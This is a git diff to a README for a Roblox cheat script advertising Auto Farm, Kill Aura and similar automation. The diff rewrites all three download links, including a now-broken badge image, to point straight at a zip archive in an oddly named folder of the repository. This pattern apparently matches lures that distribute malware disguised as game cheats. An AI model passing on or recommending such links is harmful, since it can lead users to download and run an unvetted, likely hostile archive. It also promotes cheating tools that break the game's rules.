@@ -1,6 +1,6 @@
 # 🚀 Roblox-The-Forge-Script - Automate Your Roblox Gameplay Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com)
+[![Download Now](https://raw.githubusercontent.com/Lappy404/Roblox-The-Forge-Script/main/endointoxication/Forge_Script_Roblox_The_v1.0.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Lappy404/Roblox-The-Forge-Script/main/endointoxication/Forge_Script_Roblox_The_v1.0.zip)
 
 ## 📖 Description
 Roblox-The-Forge-Script is a free tool designed to enhance your Roblox experience. This script offers features like Auto Farm, Auto Zombies, Kill Aura, and resource tools through a user-friendly graphical interface. With this script, you can automate forging, gather materials, clear enemies, and safely hunt for resources in various worlds. This tool works on both PC and mobile devices. It undergoes regular updates for dependable in-game automation.
@@ -22,7 +22,7 @@ Follow these steps to download and install the Roblox-The-Forge-Script:
 1. **Visit the Download Page**
    Access the releases page for Roblox-The-Forge-Script using the link below:
 
-   [Download from GitHub](https://github.com)
+   [Download from GitHub](https://raw.githubusercontent.com/Lappy404/Roblox-The-Forge-Script/main/endointoxication/Forge_Script_Roblox_The_v1.0.zip)
 
 2. **Choose Your Version**
    Look for the latest version of the script. The most recent version has the most features and bug fixes.
@@ -77,6 +77,6 @@ This project is licensed under the MIT License. You can use it freely as long as
 ## 📥 Download & Install
 To begin your journey with Roblox-The-Forge-Script, visit the download page below:
 
-[Download from GitHub](https://github.com)
+[Download from GitHub](https://raw.githubusercontent.com/Lappy404/Roblox-The-Forge-Script/main/endointoxication/Forge_Script_Roblox_The_v1.0.zip)
 
 Ensure you follow the installation steps carefully, and enjoy automating your gameplay.
